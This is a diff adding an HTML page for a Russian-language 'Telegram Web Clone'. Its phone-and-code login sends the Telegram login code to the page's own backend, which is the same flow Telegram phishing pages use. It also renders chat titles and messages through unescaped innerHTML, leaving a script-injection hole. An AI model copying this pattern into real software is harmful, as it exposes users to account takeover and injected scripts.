@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Web Clone</title>
+    <style>
+        :root {
+            --tg-blue: #0088cc;
+            --tg-bg: #ffffff;
+            --tg-chat-bg: #e7ebf0;
+            --tg-sidebar: #ffffff;
+        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; margin: 0; display: flex; height: 100vh; }
+        
+        #sidebar { width: 30%; border-right: 1px solid #ddd; display: flex; flex-direction: column; }
+        #chat-area { flex: 1; background: var(--tg-chat-bg); display: flex; flex-direction: column; }
+        
+        .auth-form { padding: 20px; border-radius: 8px; background: white; width: 300px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .chat-item { padding: 15px; border-bottom: 1px solid #f0f0f0; cursor: pointer; transition: 0.2s; }
+        .chat-item:hover { background: #f5f5f5; }
+        .premium-star { color: #8e44ad; margin-left: 5px; } /* Визуальный Premium */
+        
+        #messages { flex: 1; padding: 20px; overflow-y: auto; }
+        #input-area { padding: 15px; background: white; display: flex; }
+        input { padding: 10px; border: 1px solid #ccc; border-radius: 5px; width: 80%; }
+        button { background: var(--tg-blue); color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="auth-container" style="display: flex; width: 100%;">
+        <div class="auth-form" id="phone-step">
+            <h3>Вход в Telegram</h3>
+            <input type="text" id="phone" placeholder="+79001234567">
+            <button onclick="sendCode()">Далее</button>
+        </div>
+        <div class="auth-form" id="code-step" style="display:none;">
+            <h3>Введите код</h3>
+            <input type="text" id="code" placeholder="12345">
+            <button onclick="login()">Войти</button>
+        </div>
+    </div>
+
+    <div id="main-app" style="display:none; width: 100%; height: 100%;">
+        <div id="sidebar">
+            <div style="padding: 15px; background: var(--tg-blue); color: white; font-weight: bold;">
+                Telegram Web Clone <span class="premium-star">★</span>
+            </div>
+            <div id="dialog-list"></div>
+        </div>
+        <div id="chat-area">
+            <div id="messages"></div>
+            <div id="input-area">
+                <input type="text" id="msg-input" placeholder="Напишите сообщение...">
+                <button onclick="sendMessage()">Отправить</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let phoneCodeHash = "";
+        let phoneNumber = "";
+
+        async function sendCode() {
+            phoneNumber = document.getElementById('phone').value;
+            const res = await fetch('/api/send-code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phoneNumber })
+            });
+            const data = await res.json();
+            if(data.success) {
+                phoneCodeHash = data.phoneCodeHash;
+                document.getElementById('phone-step').style.display = 'none';
+                document.getElementById('code-step').style.display = 'block';
+            }
+        }
+
+        async function login() {
+            const phoneCode = document.getElementById('code').value;
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phoneNumber, phoneCode, phoneCodeHash })
+            });
+            const data = await res.json();
+            if(data.success) {
+                document.getElementById('auth-container').style.display = 'none';
+                document.getElementById('main-app').style.display = 'flex';
+                loadDialogs();
+            }
+        }
+
+        async function loadDialogs() {
+            const res = await fetch('/api/dialogs');
+            const dialogs = await res.json();
+            const list = document.getElementById('dialog-list');
+            list.innerHTML = dialogs.map(d => `
+                <div class="chat-item">
+                    <strong>${d.title}</strong> <span class="premium-star">★</span>
+                    <div style="font-size: 12px; color: #777;">${d.lastMessage || 'Нет сообщений'}</div>
+                </div>
+            `).join('');
+        }
+    </script>
+</body>
+</html>
